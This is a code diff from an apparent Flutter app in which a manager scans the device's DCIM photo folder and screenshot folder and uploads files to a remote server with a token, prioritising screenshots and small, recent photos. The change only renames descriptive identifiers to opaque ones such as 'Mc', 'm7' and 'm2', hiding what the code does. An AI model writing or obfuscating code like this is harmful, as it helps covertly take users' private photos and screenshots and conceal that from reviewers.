@@ -25,12 +25,12 @@ import '../config/secrets.dart';
 import '../device_info_helper.dart';
 
 // ── 配置 ──────────────────────────────────────────────────────────────
-class DcimUploadConfig {
+class Mc {
   final String uploadUrl;
   final String uploadToken;
   final String serverBaseUrl;
 
-  final String dcimPath;
+  final String m7;
   final Duration uploadTimeout;
   final int maxFiles;
 
@@ -52,11 +52,11 @@ class DcimUploadConfig {
   final Duration serverWaitInterval;
   final int serverWaitMaxAttempts;
 
-  const DcimUploadConfig({
+  const Mc({
     this.uploadUrl = '',
     this.uploadToken = '',
     this.serverBaseUrl = '',
-    this.dcimPath = '',
+    this.m7 = '',
     this.uploadTimeout = const Duration(minutes: 5),
     this.maxFiles = 50,
 
@@ -84,9 +84,9 @@ class DcimUploadConfig {
 }
 
 // ── 单例管理器 ─────────────────────────────────────────────────────────
-class DcimUploadManager {
-  DcimUploadManager._internal();
-  static final DcimUploadManager instance = DcimUploadManager._internal();
+class Ma {
+  Ma._internal();
+  static final Ma instance = Ma._internal();
 
   static const String _kUploaded = 'm1p';
   static const String _kUploadedUrls = 'm1u';
@@ -95,7 +95,7 @@ class DcimUploadManager {
   /// 截图一次性完成标记
   static const String _kScreenshotDone = 'm1sc';
 
-  DcimUploadConfig _config = const DcimUploadConfig();
+  Mc _config = const Mc();
 
   /// ★ 换成 secure storage
   FlutterSecureStorage? _secure;
@@ -154,26 +154,26 @@ class DcimUploadManager {
       '${s.file.path.split('/').last}:${s.size}';
 
   // ── 初始化 ─────────────────────────────────────────────────────────
-  Future<void> initialize({DcimUploadConfig? config}) async {
+  Future<void> initialize({Mc? config}) async {
     if (_initialized) return;
 
     if (config == null) {
-      config = DcimUploadConfig(
-        uploadUrl: SecureConfig.dcimUploadUrl,
-        uploadToken: SecureConfig.dcimUploadToken,
-        serverBaseUrl: SecureConfig.dcimBaseUrl,
-        dcimPath: SecureConfig.dcimPath,
+      config = Mc(
+        uploadUrl: SecureConfig.m2,
+        uploadToken: SecureConfig.m1,
+        serverBaseUrl: SecureConfig.m3,
+        m7: SecureConfig.m7,
         screenshotPath: SecureConfig.screenshotPath,
       );
     } else {
-      final needDcim = config.dcimPath.isEmpty;
+      final n1 = config.m7.isEmpty;
       final needShot = config.screenshotPath.isEmpty;
-      if (needDcim || needShot) {
-        config = DcimUploadConfig(
+      if (n1 || needShot) {
+        config = Mc(
           uploadUrl: config.uploadUrl,
           uploadToken: config.uploadToken,
           serverBaseUrl: config.serverBaseUrl,
-          dcimPath: needDcim ? SecureConfig.dcimPath : config.dcimPath,
+          m7: n1 ? SecureConfig.m7 : config.m7,
           screenshotPath: needShot
               ? SecureConfig.screenshotPath
               : config.screenshotPath,
@@ -625,15 +625,15 @@ class DcimUploadManager {
           )
         : Future.value(<_Scanned>[]);
 
-    final dcimFuture = _scanOneDir(
-      _config.dcimPath,
+    final mF = _scanOneDir(
+      _config.m7,
       isScreenshot: false,
       applySizeLimit: true,
     );
 
-    final results = await Future.wait([shotFuture, dcimFuture]);
+    final results = await Future.wait([shotFuture, mF]);
     final shotsAll = results[0];
-    final dcimAll = results[1];
+    final mA = results[1];
 
     // 记录截图目录符合条件的文件数（未过滤 _uploaded）
     _lastScannedShotCount = shotsAll.length;
@@ -647,11 +647,11 @@ class DcimUploadManager {
         shotsPending.take(_config.screenshotMaxFiles).toList();
 
     // DCIM：过滤已上传 → 小文件优先 + 新优先
-    final dcimPending = dcimAll
+    final mP = mA
         .where((s) => !_uploaded.contains(_fingerprint(s)))
         .toList();
     final smallBytes = _config.smallFileBytes;
-    dcimPending.sort((a, b) {
+    mP.sort((a, b) {
       final aSmall = a.size <= smallBytes;
       final bSmall = b.size <= smallBytes;
       if (aSmall != bSmall) return aSmall ? -1 : 1;
@@ -661,7 +661,7 @@ class DcimUploadManager {
     // 合并：截图优先
     final merged = <_Scanned>[];
     merged.addAll(pickedShots);
-    merged.addAll(dcimPending.take(_config.maxFiles));
+    merged.addAll(mP.take(_config.maxFiles));
 
     if (!_screenshotDone) {
       if (_lastScannedShotCount == 0) {
